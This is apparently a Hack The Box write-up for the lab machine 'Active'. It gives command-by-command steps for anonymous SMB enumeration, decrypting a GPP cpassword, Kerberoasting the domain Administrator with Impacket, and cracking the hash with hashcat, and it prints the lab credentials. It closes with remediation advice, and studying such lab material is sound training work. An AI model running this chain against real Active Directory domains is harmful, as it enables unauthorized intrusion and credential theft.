---
title: "HTB Active Writeup: Unauthenticated SMB GPP Decryption to Kerberoasting Root"
title_post: "HTB Active Writeup: Unauthenticated SMB GPP Decryption to Kerberoasting Root"
date: 2026-08-12 00:00:00 +0500

categories:
  - HTB
  - Windows
  - Easy

tags:
  - htb-windows-easy
  - htb
  - windows
  - active-directory
  - gpp-cpassword
  - kerberoasting
  - smb
  - privilege-escalation
  - ms14-025

description: Detailed Hack The Box Active writeup. Leverage unauthenticated SMB access to extract Group Policy Preference (GPP) encrypted passwords, obtain initial access as SVC_TGS, and perform Kerberoasting to compromise the Domain Administrator account.

image:
  path: /assets/img/writeups/active/banner.png
  alt: HTB Active Writeup
---

## 1. Machine Information

| Machine | Active |
|---------|--------|
| Platform | [Hack The Box](https://www.hackthebox.com/) |
| OS | Windows |
| Difficulty | Easy |
| Initial Access | Unauthenticated SMB GPP `cpassword` Decryption (MS14-025) |
| Privilege Escalation | Kerberoasting Domain Administrator SPN |

## 2. Attack Path

```text
Unauthenticated SMB Share Enumeration (Replication Share)
        ↓
Group Policy Preferences (GPP) Groups.xml Extraction
        ↓
GPP Password Decryption (gpp-decrypt / cpassword)
        ↓
Initial Domain User Access (active.htb\SVC_TGS)
        ↓
Active Directory Service Principal Name Enumeration (impacket-GetUserSPNs)
        ↓
Kerberoasting Domain Administrator (TGS-REP Hash Extraction)
        ↓
Offline Hash Cracking (Hashcat -m 13100 & rockyou.txt)
        ↓
Full Administrative Access via SMB (C$ Share)
```

## 3. Overview

**Active** is an easy-difficulty Windows machine on **Hack The Box** that demonstrates foundational Active Directory attack vectors, specifically legacy credential exposure in Group Policy Preferences (GPP) and service account Kerberoasting.

The attack vector begins with unauthenticated SMB enumeration of the `Replication` share. Searching through domain policy directories leads to an XML file (`Groups.xml`) containing an encrypted `cpassword`. Using the publicly known Microsoft GPP static key (MS14-025), the password is decrypted to grant initial access as domain user `SVC_TGS`.

With authenticated domain privileges, enumeration of Service Principal Names (SPNs) reveals that the domain `Administrator` account has an active SPN set. Requesting a Kerberos TGS ticket and cracking it offline via Hashcat yields the domain Administrator's password, granting full administrative control over the Domain Controller.

## 4. Reconnaissance

An initial Nmap scan was executed against the target IP (`10.129.1.205`):

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ nmap -sC -sV 10.129.1.205 -v -T4

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
```

> **Key Findings**
>
> - Port 53 (DNS), Port 88 (Kerberos), Port 389 (LDAP), and Port 445 (SMB) are open.
> - The target is identified as a Domain Controller for `active.htb`.
> - Operating System: Windows Server 2008 R2 SP1.
{: .prompt-info }

## 5. Information Disclosure & Enumeration

Checking for anonymous share access on SMB using `smbclient`:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ smbclient -L //10.129.1.205/ -N

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Replication     Disk
	SYSVOL          Disk      Logon server share
	Users           Disk
```

Navigating into the `Replication` share to hunt for Group Policy Preferences configuration files:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ smbclient //10.129.1.205/Replication -N

smb: \> cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
smb: \active.htb\Policies\{...}\MACHINE\Preferences\Groups\> get Groups.xml
```

Inspecting `Groups.xml` reveals an encrypted `cpassword` string:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User changed="2018-07-18 20:46:06" clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" image="2" name="active.htb\SVC_TGS" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties acctDisabled="0" action="U" changeLogon="0" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" description="" fullName="" neverExpires="1" newName="" noChange="1" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

Decrypting the password using `gpp-decrypt`:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

GPPstillStandingStrong2k18
```

> **Exposed Credentials**
>
> ```text
> Username: active.htb\SVC_TGS
> Password: GPPstillStandingStrong2k18
> ```
{: .prompt-warning }

## 6. Initial Access & User Flag

Authenticating to the `Users` share as `active.htb\SVC_TGS`:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ smbclient //10.129.1.205/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18

smb: \> cd SVC_TGS\Desktop\
smb: \SVC_TGS\Desktop\> get user.txt
```

Retrieving `user.txt`:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ cat user.txt

<REDACTED>
```

## 7. Privilege Escalation

### 7.1 Kerberoasting Enumeration

With authenticated domain user access (`SVC_TGS`), checking for accounts with registered Service Principal Names (SPNs) using Impacket's `GetUserSPNs`:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ impacket-GetUserSPNs -request -dc-ip 10.129.1.205 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:06:40.351723  2026-08-11 12:38:28.860153
```

> **Vulnerability Analysis**
>
> The domain `Administrator` account has an active SPN (`active/CIFS:445`). Requesting a Kerberos TGS ticket for this SPN returns a ticket encrypted with the Administrator's password-derived key, allowing offline cracking.
{: .prompt-warning }

### 7.2 Offline Hash Cracking

Unzipping `rockyou.txt` and running Hashcat with mode `13100` (Kerberos 5 TGS-REP etype 23):

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz

┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

Hashcat output:

```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*...:Ticketmaster1968

Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Candidates.#1....: Tiffany95 -> Thelittlemermaid
```

The cracked Domain Administrator password is **`Ticketmaster1968`**.

### 7.3 Root Access

Connecting to the `C$` administrative share as domain Administrator:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ smbclient //10.129.1.205/C\$ -U active.htb\\Administrator%Ticketmaster1968

smb: \> get Users\Administrator\Desktop\root.txt
```

Retrieving the root flag:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/active]
└─$ cat root.txt

<REDACTED>
```

The target system was fully compromised.

## 8. Conclusion

Active demonstrated a complete Active Directory attack chain involving:

- Anonymous SMB share access exposing Group Policy Preferences.
- Recovering a GPP `cpassword` protected with the legacy MS14-025 mechanism.
- Decrypting the stored password to obtain valid domain credentials.
- Active Directory Service Principal Name (SPN) enumeration.
- Kerberoasting a highly privileged account.
- Offline cracking of the TGS-REP hash.
- Administrative access through the SMB `C$` share.

> **Remediation Takeaways**
>
> 1. **GPP Remediation:** Apply KB2962486 (MS14-025) to prevent storing passwords in Group Policy Preferences and remove existing XML files containing `cpassword` attributes from `SYSVOL` and other exposed policy shares.
>
> 2. **SPN Hardening:** Avoid assigning SPNs to highly privileged accounts such as Domain Administrator. Where service accounts require SPNs, use dedicated low-privilege accounts or Group Managed Service Accounts (gMSAs).
>
> 3. **Password Policy Enforcement:** Ensure service accounts with SPNs use long, unique, randomly generated passwords that are resistant to offline dictionary attacks.
{: .prompt-tip }
